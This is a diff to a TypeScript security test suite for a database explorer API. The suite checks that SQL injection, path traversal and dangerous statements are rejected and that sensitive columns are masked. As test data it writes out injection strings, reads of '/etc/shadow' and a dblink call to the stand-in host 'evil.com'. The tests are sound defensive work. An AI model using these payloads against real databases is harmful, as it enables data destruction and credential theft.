@@ -55,6 +55,20 @@ describe('DatabaseExplorerController Security', () => {
       .compile();
 
     app = module.createNestApplication();
+    // Production attaches the verified operator before the controller runs, and
+    // every audited read here records who performed it. Injecting it at the
+    // edge — rather than through the guard double — keeps the spec honest no
+    // matter which guard the controller resolves.
+    app.use((req: { user?: unknown }, _res: unknown, next: () => void) => {
+      req.user = {
+        id: 'super-admin-1',
+        sub: 'super-admin-1',
+        email: 'ops@example.com',
+        name: 'Ops Admin',
+        roles: ['SUPER_ADMIN'],
+      };
+      next();
+    });
     app.useGlobalPipes(
       new ValidationPipe({
         whitelist: true,
@@ -91,19 +105,20 @@ describe('DatabaseExplorerController Security', () => {
     const maliciousSchemaNames = [
       'admin"; DROP TABLE users; --',
       "admin'; DELETE FROM tenants; --",
-      'admin\' OR \'1\'=\'1',
+      "admin' OR '1'='1",
       '../../../etc/passwd',
       'admin/**/union/**/select',
       'admin;',
       'admin--',
-      'ADMIN.users',   // dot notation attempt
-      'admin DROP',    // space in identifier
+      'ADMIN.users', // dot notation attempt
+      'admin DROP', // space in identifier
     ];
 
     maliciousSchemaNames.forEach((schema) => {
       it(`should reject malicious schema name: "${schema.substring(0, 40)}..."`, async () => {
-        const res = await request(app.getHttpServer())
-          .get(`/database/explorer/schemas/${encodeURIComponent(schema)}/tables`);
+        const res = await request(app.getHttpServer()).get(
+          `/database/explorer/schemas/${encodeURIComponent(schema)}/tables`,
+        );
 
         expect(res.status).toBe(HttpStatus.BAD_REQUEST);
         expect(res.body.message).toContain('Invalid schema name');
@@ -118,8 +133,9 @@ describe('DatabaseExplorerController Security', () => {
 
     maliciousTableNames.forEach((table) => {
       it(`should reject malicious table name: "${table.substring(0, 40)}..."`, async () => {
-        const res = await request(app.getHttpServer())
-          .get(`/database/explorer/schemas/public/tables/${encodeURIComponent(table)}/data`);
+        const res = await request(app.getHttpServer()).get(
+          `/database/explorer/schemas/public/tables/${encodeURIComponent(table)}/data`,
+        );
 
         expect(res.status).toBe(HttpStatus.BAD_REQUEST);
       });
@@ -128,8 +144,9 @@ describe('DatabaseExplorerController Security', () => {
     it('should accept valid identifier (lowercase alpha + underscore)', async () => {
       mockQueryRunner.query.mockResolvedValue([]);
 
-      const res = await request(app.getHttpServer())
-        .get('/database/explorer/schemas/public/tables');
+      const res = await request(app.getHttpServer()).get(
+        '/database/explorer/schemas/public/tables',
+      );
 
       expect(res.status).toBe(HttpStatus.OK);
     });
@@ -141,8 +158,9 @@ describe('DatabaseExplorerController Security', () => {
         .mockResolvedValueOnce([{ count: '0' }]) // count
         .mockResolvedValueOnce([]); // data
 
-      const res = await request(app.getHttpServer())
-        .get('/database/explorer/schemas/public/tables/users_v2/data');
+      const res = await request(app.getHttpServer()).get(
+        '/database/explorer/schemas/public/tables/users_v2/data',
+      );
 
       expect(res.status).toBe(HttpStatus.OK);
     });
@@ -197,8 +215,8 @@ describe('DatabaseExplorerController Security', () => {
       { sql: 'CREATE TABLE hack (id int)', label: 'CREATE' },
       { sql: 'GRANT ALL ON users TO public', label: 'GRANT' },
       { sql: 'REVOKE ALL ON users FROM public', label: 'REVOKE' },
-      { sql: "EXECUTE sp_who2", label: 'EXECUTE' },
-      { sql: "CALL my_procedure()", label: 'CALL' },
+      { sql: 'EXECUTE sp_who2', label: 'EXECUTE' },
+      { sql: 'CALL my_procedure()', label: 'CALL' },
     ];
 
     dangerousStatements.forEach(({ sql, label }) => {
@@ -222,8 +240,8 @@ describe('DatabaseExplorerController Security', () => {
       { sql: "SELECT pg_read_binary_file('/etc/shadow')", label: 'pg_read_binary_file' },
       { sql: "SELECT pg_write_file('/tmp/hack', 'data')", label: 'pg_write_file' },
       { sql: "SELECT pg_ls_dir('/tmp')", label: 'pg_ls_dir' },
-      { sql: "SELECT pg_terminate_backend(123)", label: 'pg_terminate_backend' },
-      { sql: "SELECT pg_cancel_backend(123)", label: 'pg_cancel_backend' },
+      { sql: 'SELECT pg_terminate_backend(123)', label: 'pg_terminate_backend' },
+      { sql: 'SELECT pg_cancel_backend(123)', label: 'pg_cancel_backend' },
       { sql: "SELECT * FROM dblink('host=evil.com', 'SELECT 1')", label: 'dblink' },
       { sql: "SELECT 1; copy to '/tmp/dump'", label: 'COPY TO' },
       { sql: "SELECT 1; copy from '/tmp/inject'", label: 'COPY FROM' },
@@ -283,7 +301,7 @@ describe('DatabaseExplorerController Security', () => {
 
         const res = await request(app.getHttpServer())
           .post('/database/explorer/query')
-          .send({ sql: "SELECT 1 -- safe\nDROP TABLE users" });
+          .send({ sql: 'SELECT 1 -- safe\nDROP TABLE users' });
 
         expect(res.status).toBe(HttpStatus.BAD_REQUEST);
       });
@@ -293,14 +311,10 @@ describe('DatabaseExplorerController Security', () => {
       process.env['NODE_ENV'] = 'development';
       mockQueryRunner.query.mockResolvedValue([]);
 
-      await request(app.getHttpServer())
-        .post('/database/explorer/query')
-        .send({ sql: 'SELECT 1' });
+      await request(app.getHttpServer()).post('/database/explorer/query').send({ sql: 'SELECT 1' });
 
       // First call should set statement_timeout
-      expect(mockQueryRunner.query).toHaveBeenCalledWith(
-        'SET statement_timeout = 30000',
-      );
+      expect(mockQueryRunner.query).toHaveBeenCalledWith('SET statement_timeout = 30000');
     });
   });
 
@@ -309,16 +323,24 @@ describe('DatabaseExplorerController Security', () => {
   // ========================================================================
   describe('Sensitive column masking', () => {
     const sensitiveColumns = [
-      'password', 'password_hash', 'api_key', 'api_secret',
-      'access_token', 'refresh_token', 'mfa_secret', 'private_key',
-      'jwt_secret', 'webhook_secret',
+      'password',
+      'password_hash',
+      'api_key',
+      'api_secret',
+      'access_token',
+      'refresh_token',
+      'mfa_secret',
+      'private_key',
+      'jwt_secret',
+      'webhook_secret',
     ];
 
     it('should mask sensitive columns by default', async () => {
       // Mock column info query
       mockQueryRunner.query
         .mockResolvedValueOnce([]) // SET TRANSACTION READ ONLY
-        .mockResolvedValueOnce([ // getTables columns query
+        .mockResolvedValueOnce([
+          // getTables columns query
           {
             column_name: 'id',
             data_type: 'uuid',
@@ -337,12 +359,14 @@ describe('DatabaseExplorerController Security', () => {
           },
         ])
         .mockResolvedValueOnce([{ count: '1' }]) // COUNT query
-        .mockResolvedValueOnce([ // data query
+        .mockResolvedValueOnce([
+          // data query
           { id: 'u1', password: 'secret123' },
         ]);
 
-      const res = await request(app.getHttpServer())
-        .get('/database/explorer/schemas/auth/tables/users/data');
+      const res = await request(app.getHttpServer()).get(
+        '/database/explorer/schemas/auth/tables/users/data',
+      );
 
       expect(res.status).toBe(HttpStatus.OK);
       // Password should be masked
@@ -352,8 +376,9 @@ describe('DatabaseExplorerController Security', () => {
     });
 
     it('should reject client-controlled sensitive unmasking', async () => {
-      const res = await request(app.getHttpServer())
-        .get('/database/explorer/schemas/auth/tables/users/data?includeSensitive=true');
+      const res = await request(app.getHttpServer()).get(
+        '/database/explorer/schemas/auth/tables/users/data?includeSensitive=true',
+      );
 
       expect(res.status).toBe(HttpStatus.BAD_REQUEST);
     });
@@ -381,8 +406,9 @@ describe('DatabaseExplorerController Security', () => {
         ])
         .mockResolvedValueOnce([{ id: 'u1', api_key: 'sk-secret-key-123' }]);
 
-      const res = await request(app.getHttpServer())
-        .get('/database/explorer/schemas/public/tables/users/export?format=json');
+      const res = await request(app.getHttpServer()).get(
+        '/database/explorer/schemas/public/tables/users/export?format=json',
+      );
 
       expect(res.status).toBe(HttpStatus.OK);
       if (Array.isArray(res.body) && res.body.length > 0) {
@@ -402,8 +428,9 @@ describe('DatabaseExplorerController Security', () => {
         .mockResolvedValueOnce([{ count: '1000' }])
         .mockResolvedValueOnce([]);
 
-      const res = await request(app.getHttpServer())
-        .get('/database/explorer/schemas/public/tables/users/data?limit=500');
+      const res = await request(app.getHttpServer()).get(
+        '/database/explorer/schemas/public/tables/users/data?limit=500',
+      );
 
       expect(res.status).toBe(HttpStatus.OK);
       // The limit used should be capped at 100
@@ -417,8 +444,9 @@ describe('DatabaseExplorerController Security', () => {
         .mockResolvedValueOnce([{ count: '10' }])
         .mockResolvedValueOnce([]);
 
-      const res = await request(app.getHttpServer())
-        .get('/database/explorer/schemas/public/tables/users/data?limit=0');
+      const res = await request(app.getHttpServer()).get(
+        '/database/explorer/schemas/public/tables/users/data?limit=0',
+      );
 
       expect(res.status).toBe(HttpStatus.OK);
       expect(res.body.limit).toBeGreaterThanOrEqual(1);
@@ -430,8 +458,9 @@ describe('DatabaseExplorerController Security', () => {
         .mockResolvedValueOnce([])
         .mockResolvedValueOnce([]);
 
-      const res = await request(app.getHttpServer())
-        .get('/database/explorer/schemas/public/tables/users/export?format=json&limit=50000');
+      const res = await request(app.getHttpServer()).get(
+        '/database/explorer/schemas/public/tables/users/export?format=json&limit=50000',
+      );
 
       // Limit should be capped internally even if larger requested
       expect(res.status).toBe(HttpStatus.OK);
@@ -477,14 +506,15 @@ describe('DatabaseExplorerController Security', () => {
     it('should reject update with malicious column names', async () => {
       const res = await request(app.getHttpServer())
         .put('/database/explorer/schemas/public/tables/users/rows/123')
-        .send({ data: { 'col\'; --': 'hacked' } });
+        .send({ data: { "col'; --": 'hacked' } });
 
       expect(res.status).toBe(HttpStatus.BAD_REQUEST);
     });
 
     it('should validate identifiers in delete operations', async () => {
-      const res = await request(app.getHttpServer())
-        .delete('/database/explorer/schemas/admin"; --/tables/users/rows/123');
+      const res = await request(app.getHttpServer()).delete(
+        '/database/explorer/schemas/admin"; --/tables/users/rows/123',
+      );
 
       expect(res.status).toBe(HttpStatus.BAD_REQUEST);
     });
@@ -497,19 +527,15 @@ describe('DatabaseExplorerController Security', () => {
     it('should release query runner after successful request', async () => {
       mockQueryRunner.query.mockResolvedValue([]);
 
-      await request(app.getHttpServer())
-        .get('/database/explorer/schemas');
+      await request(app.getHttpServer()).get('/database/explorer/schemas');
 
       expect(mockQueryRunner.release).toHaveBeenCalled();
     });
 
     it('should release query runner even on error', async () => {
-      mockQueryRunner.query
-        .mockResolvedValueOnce([])
-        .mockRejectedValueOnce(new Error('DB error'));
+      mockQueryRunner.query.mockResolvedValueOnce([]).mockRejectedValueOnce(new Error('DB error'));
 
-      await request(app.getHttpServer())
-        .get('/database/explorer/schemas/public/tables');
+      await request(app.getHttpServer()).get('/database/explorer/schemas/public/tables');
 
       expect(mockQueryRunner.release).toHaveBeenCalled();
     });
